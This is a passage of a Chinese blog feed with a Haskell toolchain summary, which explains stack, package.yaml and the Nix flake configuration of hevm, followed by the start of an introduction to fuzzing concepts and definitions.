    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><h1>总结</h1><ul><li>安装方式：<a href="https://www.haskell.org/ghcup/">https://www.haskell.org/ghcup/</a> 这是最推荐的安装方式，建议都安装上。</li><li>特性介绍：<a href="https://www.haskell.org/">https://www.haskell.org/</a></li><li>如何入门：<ul><li>理解基础规则，比如不可变性、绑定、递归</li><li>学完基本语法，包括列表、元组、类型、模式匹配、Guard 写法、where 用法、let … in 用法、case … of 用法、<code>@</code> 用法；</li><li>理解函数的类型签名</li><li>函数柯里化和 folder、map、zip、filter 等高阶函数、lambda 表达式；</li><li><code>$</code> <code>.</code> 的用法</li><li>递归的写法习惯</li><li>模块和导出，</li><li>语言拓展</li><li>Data 库中的 List、Char、Map、Set。一些对应的常见操作 ，比如列表的 <code>take</code> <code>drop</code> <code>sum</code> <code>takeWhile</code> <code>group</code> 等，可以等用到再查。</li><li>data 自定义类型（包括 product type 和 sum type 和类似泛型的 polymorphic types）；从 Maybe、Either 理解 Kind 和多态类型，从而认识到 List 的实现；type 设置别名和 newtype 设置全新类型、</li><li>类型类和类型类继承 deriving，实例 instance、</li><li>一些特殊类型类(typeclass) Functor 和 fmap、Applicative 和 <code>&lt;*&gt;</code> 、Monad 和<code>&gt;&gt;=</code></li><li>之后就是工程经验和 IO 了，在实际中慢慢积累吧。</li></ul></li><li>入门路径：<ul><li>视频课程：<a href="https://github.com/haskell-beginners-2022/course-plan">https://github.com/haskell-beginners-2022/course-plan</a></li><li>前几章学基础：<a href="https://rwh.readthedocs.io/en/latest/">https://rwh.readthedocs.io/en/latest/</a></li><li>我的入门参考博客：<a href="https://blog-blockchain.xyz/pl/FP-haskell-1/">https://blog-blockchain.xyz/pl/FP-haskell-1/</a> (有 1 到 3 章)</li><li>跟着动手写练习：<a href="https://github.com/kowainik/learn4haskell/tree/main">https://github.com/kowainik/learn4haskell/tree/main</a></li><li>趣学指南：<a href="https://flaneur2020.github.io/lyah/chapters.htm">https://flaneur2020.github.io/lyah/chapters.htm</a></li></ul></li><li>Haskell 生态速览：<a href="https://github.com/Gabriella439/post-rfc/blob/main/sotu.md">https://github.com/Gabriella439/post-rfc/blob/main/sotu.md</a></li></ul><h1>工具链</h1><h2 id="stack">stack</h2><p><a href="https://docs.haskellstack.org/en/stable/">stack</a> 非常常用的工具链，它有很多 snapshot，把一些特定版本的库，都集成在这个 snapshot 里，然后要编译时，就会自动拉取这些库。这样就提供了可以复现的环境。除此之外，还可以自定义依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">resolver: lts-21.17</span><br><span class="line"></span><br><span class="line">packages:</span><br><span class="line">- &#x27;.&#x27;</span><br><span class="line"></span><br><span class="line">extra-deps:</span><br><span class="line">- git: https://github.com/ethereum/hevm.git</span><br><span class="line">  commit: 91d906b6593f2ba74748fff9a7d34eadf1980ceb</span><br><span class="line"></span><br><span class="line">- restless-git-0.7@sha256:346a5775a586f07ecb291036a8d3016c3484ccdc188b574bcdec0a82c12db293,968</span><br><span class="line">- s-cargot-0.1.4.0@sha256:61ea1833fbb4c80d93577144870e449d2007d311c34d74252850bb48aa8c31fb,3525</span><br><span class="line"></span><br><span class="line">extra-include-dirs:</span><br><span class="line">  - /home/learner/.local/include</span><br><span class="line">extra-lib-dirs:</span><br><span class="line">  - /home/learner/.local/lib</span><br></pre></td></tr></table></figure><p>比如上面使用了 <code>lts-21.17</code> 的环境，所有的 snapshot 可以在 <a href="https://www.stackage.org/">stackage</a> 中查看。其他的是额外的依赖、额外的库，这里是 hevm 依赖了一些 C/CPP 写的密码学库。</p><p><code>stack path --stack-root</code> 中就能查看到 stack 的存储位置，目录结构如下图所示。可以看到 <code>config.yaml</code> 是全局的配置，如果缺少项目的配置文件，就默认选择全局的，否则优先项目的配置。</p><p>在开发中，为了使用 stack 的环境，需要在命令前加 stack，比如说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack ghc -- -O2 -o main</span><br><span class="line">stack ghci</span><br></pre></td></tr></table></figure><p>stack 会自动加载依赖，然后 <code>--</code> 之后是传给 <code>runghc</code> 的参数，优化等级 2 然后编译成可执行文件 main。</p><p>另外 stack 可以自己安装一些可执行文件。</p><p>另外需要注意的是，在较新的版本中，我们一般不直接编辑<code>stack.yam</code>配置，而是有个 <code>package.yaml</code> 作为配置文件，然后会自动生成 stack 和 cabal 的配置文件。<code>package.yaml</code> 中定义了依赖、语言标准、默认语言拓展、库目录、可执行文件的配置和测试的配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">name: echidna</span><br><span class="line"></span><br><span class="line">author: Trail of Bits &lt;echidna-dev@trailofbits.com&gt;</span><br><span class="line">maintainer: Trail of Bits &lt;echidna-dev@trailofbits.com&gt;</span><br><span class="line"></span><br><span class="line">version: 2.2.1</span><br><span class="line"></span><br><span class="line"># https://github.com/haskell/cabal/issues/4739</span><br><span class="line">ghc-options: -Wall -fno-warn-orphans -O2 -optP-Wno-nonportable-include-path</span><br><span class="line"></span><br><span class="line">dependencies:</span><br><span class="line">  - base</span><br><span class="line">  - aeson</span><br><span class="line">  - base16-bytestring</span><br><span class="line">  - binary</span><br><span class="line">  - bytestring</span><br><span class="line">  - code-page</span><br><span class="line">  - containers</span><br><span class="line">  - data-bword</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">language: GHC2021</span><br><span class="line"></span><br><span class="line">default-extensions:</span><br><span class="line">  - DuplicateRecordFields</span><br><span class="line">  - LambdaCase</span><br><span class="line">  - MultiWayIf</span><br><span class="line">  - NoFieldSelectors</span><br><span class="line">  - OverloadedLabels</span><br><span class="line">  - OverloadedRecordDot</span><br><span class="line">  - OverloadedStrings</span><br><span class="line"></span><br><span class="line">library:</span><br><span class="line">  source-dirs: lib/</span><br><span class="line"></span><br><span class="line">when:</span><br><span class="line">  - condition: &quot;!os(windows)&quot;</span><br><span class="line">    cpp-options: -DINTERACTIVE_UI</span><br><span class="line">    dependencies:</span><br><span class="line">      - brick</span><br><span class="line">      - unix</span><br><span class="line">      - vty</span><br><span class="line"></span><br><span class="line">executables:</span><br><span class="line">  echidna:</span><br><span class="line">    main: Main.hs</span><br><span class="line">    source-dirs: src/</span><br><span class="line">    dependencies: echidna</span><br><span class="line">    ghc-options: -threaded -with-rtsopts=-N</span><br><span class="line">    when:</span><br><span class="line">      - condition: (os(linux) || os(windows)) &amp;&amp; flag(static)</span><br><span class="line">        ghc-options:</span><br><span class="line">          - -optl-static</span><br><span class="line">      - condition: os(linux) || os(windows)</span><br><span class="line">        ghc-options:</span><br><span class="line">          - -O2</span><br><span class="line">          - -optl-pthread</span><br><span class="line">      - condition: os(darwin)</span><br><span class="line">        extra-libraries: c++</span><br><span class="line">        ld-options: -Wl,-keep_dwarf_unwind</span><br><span class="line">        ghc-options: -fcompact-unwind</span><br><span class="line">      - condition: os(windows) &amp;&amp; impl(ghc &gt;= 9.4)</span><br><span class="line">        dependencies: system-cxx-std-lib</span><br><span class="line">      - condition: os(windows) &amp;&amp; impl(ghc &lt; 9.4)</span><br><span class="line">        extra-libraries: stdc++</span><br><span class="line"></span><br><span class="line">tests:</span><br><span class="line">  echidna-testsuite:</span><br><span class="line">    main: Spec.hs</span><br><span class="line">    source-dirs: src/test</span><br><span class="line">    dependencies:</span><br><span class="line">      - echidna</span><br><span class="line">      - tasty</span><br><span class="line">      - tasty-hunit</span><br><span class="line">      - tasty-quickcheck</span><br><span class="line">    when:</span><br><span class="line">        - condition: (os(linux) || os(windows)) &amp;&amp; flag(static)</span><br><span class="line">          ghc-options:</span><br><span class="line">            - -optl-static</span><br><span class="line">        - condition: os(linux) || os(windows)</span><br><span class="line">          ghc-options:</span><br><span class="line">            - -O2</span><br><span class="line">            - -optl-pthread</span><br><span class="line">        - condition: os(darwin)</span><br><span class="line">          extra-libraries: c++</span><br><span class="line">          ld-options: -Wl,-keep_dwarf_unwind</span><br><span class="line">          ghc-options: -fcompact-unwind</span><br><span class="line">        - condition: os(windows) &amp;&amp; impl(ghc &gt;= 9.4)</span><br><span class="line">          dependencies: system-cxx-std-lib</span><br><span class="line">        - condition: os(windows) &amp;&amp; impl(ghc &lt; 9.4)</span><br><span class="line">          extra-libraries: stdc++</span><br><span class="line"></span><br><span class="line">flags:</span><br><span class="line">  static:</span><br><span class="line">    description: Pass -static to ghc when linking the stack binary.</span><br><span class="line">    manual: true</span><br><span class="line">    default: false</span><br></pre></td></tr></table></figure><h2 id="cabal">cabal</h2><p>我基本不用，因为 stack 集成了它的功能，一些 haskell 工具可能会建议使用它安装。</p><h2 id="Nix">Nix</h2><p><a href="https://nixos.org/">nix</a> 是很方便的环境管理工具，但是<strong>只支持 Linux 和 MacOS</strong>，有部分项目使用 Nix 来开发。nix 自己维护着一套环境，然后进入 nix shell，就可以从优先使用 nix 的环境，从而不影响用户的环境。但是比较烦恼的是，我的编辑器无法使用 Nix 的 LSP。</p><p>主要讲 flake.nix 的管理方式，因为 hevm 是这样管理的，完整文件可见：<a href="https://github.com/ethereum/hevm/blob/ba00516bfbffcf14cf11211de94901833cb7eef2/flake.nix">https://github.com/ethereum/hevm/blob/ba00516bfbffcf14cf11211de94901833cb7eef2/flake.nix</a></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inputs</span> = &#123;</span><br><span class="line">  flake-utils.<span class="attr">url</span> = <span class="string">&quot;github:numtide/flake-utils&quot;</span>;</span><br><span class="line">  nixpkgs.<span class="attr">url</span> = <span class="string">&quot;github:nixos/nixpkgs/nixpkgs-unstable&quot;</span>;</span><br><span class="line">  foundry.<span class="attr">url</span> = <span class="string">&quot;github:shazow/foundry.nix/monthly&quot;</span>;</span><br><span class="line">  <span class="attr">flake-compat</span> = &#123;</span><br><span class="line">    <span class="attr">url</span> = <span class="string">&quot;github:edolstra/flake-compat&quot;</span>;</span><br><span class="line">    <span class="attr">flake</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="attr">solidity</span> = &#123;</span><br><span class="line">    <span class="attr">url</span> = <span class="string">&quot;github:ethereum/solidity/1c8745c54a239d20b6fb0f79a8bd2628d779b27e&quot;</span>;</span><br><span class="line">    <span class="attr">flake</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="attr">ethereum-tests</span> = &#123;</span><br><span class="line">    <span class="attr">url</span> = <span class="string">&quot;github:ethereum/tests/v12.2&quot;</span>;</span><br><span class="line">    <span class="attr">flake</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="attr">cabal-head</span> = &#123;</span><br><span class="line">    <span class="attr">url</span> = <span class="string">&quot;github:haskell/cabal&quot;</span>;</span><br><span class="line">    <span class="attr">flake</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="attr">forge-std</span> = &#123;</span><br><span class="line">    <span class="attr">url</span> = <span class="string">&quot;github:foundry-rs/forge-std&quot;</span>;</span><br><span class="line">    <span class="attr">flake</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>input 定义了一串的依赖的来源，比如 foundry 是从 GitHub 的 shazow/foundry.nix 仓库的 monthly 分支拉取，而且不是 flake 应用。其他的类似。</p><p>outputs 函数里接收包 nixpkgs 和 inputs 中的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outputs = &#123; self, nixpkgs, flake-utils, solidity, forge-std, ethereum-tests, foundry, cabal-head, ... &#125;:</span><br></pre></td></tr></table></figure><p>然后在 <code>flake-utils.lib.eachDefaultSystem (system: ...)</code> 定义函数主体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let</span><br><span class="line">  pkgs = (import nixpkgs &#123; inherit system; config = &#123; allowBroken = true; &#125;; &#125;);</span><br></pre></td></tr></table></figure><p>导入 nix 包，设置参数，<code>system</code> 参数是当前系统架构，允许包含那些被标记为不稳定或损坏的包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">testDeps = with pkgs; [</span><br><span class="line">  go-ethereum</span><br><span class="line">  solc</span><br><span class="line">  z3</span><br><span class="line">  cvc5</span><br><span class="line">  git</span><br><span class="line">] ++ lib.optional (!(pkgs.stdenv.isDarwin &amp;&amp; pkgs.stdenv.isAarch64)) [</span><br><span class="line">  foundry.defaultPackage.$&#123;system&#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>测试的依赖包括了上面的 5 个工具，还有一个可选的工具，当系统环境不是 ARM64 架构下的 Darwin 平台时，还会引入根据 system 参数选择的 foundry。</p><p>接着定义需要的 Haskell 的包，ghc 9.4 作为默认包的集合，然后修改部分包的配置。self 是当前配置，super 是默认的父配置，rec 允许{…}里的元素相互定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkgs.haskell.packages.ghc94.override &#123;</span><br><span class="line">overrides = with pkgs.haskell.lib; self: super: rec &#123;...&#125;;&#125;;</span><br></pre></td></tr></table></figure><p>覆盖的部分包括，dontCheck 不运行包的测试套件，self.callCabal2nix 这个函数为 Cabal 相关的包自动生成 Nix 表达式，比如对于 <code>cabal-install</code> 包，从定义好的来源获取，使用默认参数。doJailbreak 忽略版本限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cabal-install = dontCheck (self.callCabal2nix &quot;cabal-install&quot; &quot;$&#123;cabal-head&#125;/cabal-install&quot; &#123;&#125;);</span><br><span class="line"></span><br><span class="line">cabal-install-solver = dontCheck (self.callCabal2nix &quot;cabal-install-solver&quot; &quot;$&#123;cabal-head&#125;/cabal-install-solver&quot; &#123;&#125;);</span><br><span class="line"></span><br><span class="line">unix = dontCheck (doJailbreak super.unix_2_8_1_1);</span><br><span class="line">filepath = dontCheck (doJailbreak super.filepath_1_4_100_4);</span><br><span class="line">process = dontCheck (doJailbreak super.process_1_6_17_0);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么简单的说，用自定义的来源重新定义了 cabal 相关的包的属性，然后一些包构建的时候不运行测试，而且忽视严格的版本限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secp256k1-static = stripDylib (pkgs.secp256k1.overrideAttrs (attrs: &#123;</span><br><span class="line">  configureFlags = attrs.configureFlags ++ [ &quot;--enable-static&quot; ];</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>修改 secp256k1 库的属性，追加了生成静态库而不是动态库，用于构建完整可独立运行的软件。</p><p>开始准备构建 hevm 的参数，初始化处理流水线的参数，然后<code>()</code>里的值以此传给<code>[]</code>里的多个函数，比如第一个函数处理完，把结果传给第二个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hevmUnwrapped = (with pkgs; lib.pipe (...)[..])</span><br></pre></td></tr></table></figure><p>首先从当前目录下的 <code>hevm.cabal</code> 文件，生成 nix 表达式。然后依赖 secp256k1 的 C 语言密码学库。</p><p>第一个函数修改构建时 Cabal 的参数，构建时执行测试。第二个函数把 solc 等工具依赖加入测试的依赖里。第三个函数在构建时添加 -v3，输出详细日志。后面的函数也是类似的，增加了传递给 ghc 的依赖库，编译参数等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(haskell.lib.compose.overrideCabal (old: &#123; testTarget = &quot;test&quot;; &#125;))</span><br><span class="line">(haskell.lib.compose.addTestToolDepends testDeps)</span><br><span class="line">(haskell.lib.compose.appendBuildFlags [&quot;-v3&quot;])</span><br><span class="line"></span><br><span class="line">(haskell.lib.compose.appendConfigureFlags (</span><br><span class="line">  [ &quot;-fci&quot;</span><br><span class="line">    &quot;-O2&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;stripDylib (pkgs.gmp.override &#123; withStatic = true; &#125;)&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;stripDylib secp256k1-static&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;stripDylib (libff.override &#123; enableStatic = true; &#125;)&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;zlib.static&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;stripDylib (libffi.overrideAttrs (_: &#123; dontDisableStatic = true; &#125;))&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;stripDylib (ncurses.override &#123; enableStatic = true; &#125;)&#125;/lib&quot;</span><br><span class="line">  ]</span><br><span class="line">  ++ lib.optionals stdenv.isLinux [</span><br><span class="line">    &quot;--enable-executable-static&quot;</span><br><span class="line">    # TODO: replace this with musl: https://stackoverflow.com/a/57478728</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;glibc&#125;/lib&quot;</span><br><span class="line">    &quot;--extra-lib-dirs=$&#123;glibc.static&#125;/lib&quot;</span><br><span class="line">  ]))</span><br></pre></td></tr></table></figure><p>等等这些定义好了后，在 <code>in rec&#123;...&#125;</code> 里执行编译命令。</p><p>总而言之，Nix 提供了一种专门的语法，用于描述依赖关系和构建的参数。并且它提供了全局的且独立的工具，这样能够避免环境之间的冲突。但是可以知道，很多工具它都自己编译，可能第一次运行速度会比较慢。另外，nix shell 可能需要额外的配置，才能让 vim 等软件用上它的环境。·</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>（十）Fuzzing 基础</title>
    <link href="https://www.blog-blockchain.xyz/pl/fuzzing-introduction/"/>
    <id>https://www.blog-blockchain.xyz/pl/fuzzing-introduction/</id>
    <published>2023-10-21T09:00:30.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><blockquote><p>这主要是[1]的阅读总结</p></blockquote><h1>Fuzzing 是什么</h1><p>在众多软件测试技术中，Fuzzing 因其概念的简单性、易于部署以及在发现实际软件漏洞方面的有效性而受到广泛青睐。简而言之，Fuzzing 是使用异常或非预期的输入（称为“fuzz 输入”）来运行待测试的程序（Program Under Test, PUT）的过程。这种 fuzz 输入是 PUT 可能没有预料到的，也就是说，它可能会使 PUT 处理不当，从而触发开发者未预期的行为。</p><p><strong>定义 1 (Fuzzing)</strong>：<em>Fuzzing 是指使用从所谓的“fuzz 输入空间”中抽取的输入来执行 PUT 的过程，这个输入空间超出了 PUT 的预期输入范围</em>。</p><p><strong>定义 2 (Fuzz Testing)</strong>：<em>Fuzz 测试是利用 fuzzing 来检查 PUT 是否违反了某些特定的正确性策略</em>。</p><p><strong>定义 3 (Fuzzer)</strong>：<em>Fuzzer 是进行 fuzz 测试的工具，专门用于测试 PUT</em>。</p><p><strong>定义 4 (Fuzz Campaign)</strong>：<em>Fuzz campaign 是在特定的正确性策略下，对 PUT 执行 fuzzer 的特定过程</em>。</p><p><strong>定义 5 (Bug Oracle)</strong>：<em>Bug oracle 是一个程序，有时作为 fuzzer 的一部分，用于判断 PUT 的特定执行是否违反了某个特定的正确性策略</em>。</p><p>通过这些定义，Fuzzing 作为一种测试方法提供了一种系统化和自动化的方式来探测软件中的潜在漏洞，使软件开发者能够更有效地确保软件的稳定性和安全性。</p><h2 id="通用-Fuzz-测试算法">通用 Fuzz 测试算法</h2><p>在讨论 fuzz 配置时，需要注意的是，配置中的值类型取决于所使用的 fuzz 算法。例如，向待测试程序（PUT）发送随机字节流的简单 fuzz 算法具有一个基础的配置空间。而另一方面，更复杂的 fuzzers 则包含接受一系列配置并随时间进行调整的算法，这可能包括配置的添加和删除。</p><p>种子是传递给 PUT 的一个通常结构良好的输入，它被用于通过修改生成测试用例。Fuzzers 通常维护一个称为“种子池”的种子集合，而且某些 fuzzers 会随着 fuzz campaign 的进行而更新这个池。</p><img src="http://cdn.blog-blockchain.xyz/202310171416565.png" alt="图像" style="zoom:50%;" /><p>算法 1 接受一组 fuzz 配置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">C</mi></mrow><annotation encoding="application/x-tex">\mathbb{C}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">C</span></span></span></span>和一个时间限制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>l</mi><mi>i</mi><mi>m</mi><mi>i</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{limit}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">imi</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>作为输入，并输出一组发现的 bug <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">B</mi></mrow><annotation encoding="application/x-tex">\mathbb{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">B</span></span></span></span>。该算法的第一部分是<code>PREPROCESS</code>函数，它在 fuzz campaign 开始时执行。第二部分是循环中的五个函数系列：<code>SCHEDULE</code>、<code>INPUTGEN</code>、<code>INPUTEVAL</code>、<code>CONFUPDATE</code>和<code>CONTINUE</code>。</p><p>每次循环的执行被称为<em>fuzz iteration</em>，而每次<code>INPUTEVAL</code>在一个测试用例上执行 PUT 的动作被称为<em>fuzz run</em>。</p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">PREPROCESS</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi mathvariant="double-struck">C</mi><mo stretchy="false">)</mo><mo>→</mo><mi mathvariant="double-struck">C</mi></mrow><annotation 